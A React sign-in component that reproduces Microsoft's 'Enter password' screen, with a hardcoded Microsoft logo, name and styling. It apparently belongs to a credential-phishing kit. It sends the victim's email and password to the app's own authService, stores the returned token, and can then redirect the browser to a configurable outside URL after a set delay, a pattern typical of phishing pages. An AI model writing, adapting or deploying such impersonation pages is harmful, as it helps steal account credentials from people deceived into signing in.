import React, { useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { ArrowLeft } from 'lucide-react';
import { Button } from '../components/ui/button';
import { Input } from '../components/ui/input';
import authService from '../services/authService';

const Password = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const email = location.state?.email || '';
  
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  if (!email) {
    navigate('/');
    return null;
  }

  const handleSignIn = async (e) => {
    e.preventDefault();
    setError('');

    if (!password.trim()) {
      setError('Please enter your password.');
      return;
    }

    setLoading(true);
    try {
      const result = await authService.login(email, password);
      
      // Store auth data in localStorage
      authService.storeAuthData(result.token, result.user);
      
      // Get redirect configuration
      const config = await authService.getConfig();
      
      // Show brief success message before closing
      setLoading(false);
      
      if (config.autoRedirect) {
        // Wait configured delay then redirect
        setTimeout(() => {
          window.location.href = config.redirectUrl;
        }, config.redirectDelay);
      } else {
        // Navigate to dashboard if auto-redirect is disabled
        navigate('/dashboard');
      }
      
    } catch (err) {
      setError(err.message || 'Sign in failed. Please try again.');
      setLoading(false);
    }
  };

  const handleBack = () => {
    navigate('/');
  };

  return (
    <div className="min-h-screen bg-white flex items-center justify-center p-4">
      <div className="w-full max-w-[440px]">
        {/* Microsoft Logo */}
        <div className="mb-8">
          <div className="flex items-center gap-4 mb-8">
            <div className="grid grid-cols-2 gap-1">
              <div className="w-5 h-5 bg-[#F25022]"></div>
              <div className="w-5 h-5 bg-[#7FBA00]"></div>
              <div className="w-5 h-5 bg-[#00A4EF]"></div>
              <div className="w-5 h-5 bg-[#FFB900]"></div>
            </div>
            <span className="text-2xl font-[600] text-[#5E5E5E]">Microsoft</span>
          </div>
        </div>

        {/* Back button with email */}
        <button
          onClick={handleBack}
          className="flex items-center gap-2 mb-4 text-[#0067B8] hover:underline p-1 -ml-1 transition-all group"
        >
          <ArrowLeft className="w-3 h-3 group-hover:-translate-x-1 transition-transform" />
          <span className="text-[15px]">{email}</span>
        </button>

        {/* Enter password heading */}
        <h1 className="text-[28px] font-[600] text-[#1B1B1B] mb-3 leading-tight">Enter password</h1>

        {/* Form */}
        <form onSubmit={handleSignIn} className="space-y-4">
          <div className="space-y-2">
            <div className="relative">
              <Input
                type={showPassword ? 'text' : 'password'}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Password"
                className="w-full h-12 px-3 pt-4 pb-2 border-b-2 border-t-0 border-x-0 border-[#8A8886] rounded-none bg-[#F3F2F1] hover:border-[#323130] focus:border-[#0078D4] focus-visible:ring-0 focus-visible:ring-offset-0 placeholder:text-[#605E5C] text-[15px] transition-colors"
                disabled={loading}
                autoFocus
                autoComplete="current-password"
              />
            </div>
            {error && (
              <p className="text-[#E81123] text-[13px] mt-2 flex items-start gap-1">
                <span>⚠</span>
                <span>{error}</span>
              </p>
            )}
          </div>

          <div className="space-y-3 pt-2">
            <button
              type="button"
              onClick={() => navigate('/forgot-password', { state: { email } })}
              className="text-[#0067B8] hover:underline text-[13px] font-normal block"
            >
              Forgot password?
            </button>
          </div>

          <div className="pt-6 flex justify-end">
            <Button
              type="submit"
              disabled={loading}
              className="bg-[#0067B8] hover:bg-[#005A9E] text-white px-10 h-8 rounded-sm font-[600] text-[15px] transition-colors disabled:opacity-50"
            >
              {loading ? 'Signing in...' : 'Sign in'}
            </Button>
          </div>
        </form>
      </div>
    </div>
  );
};

export default Password;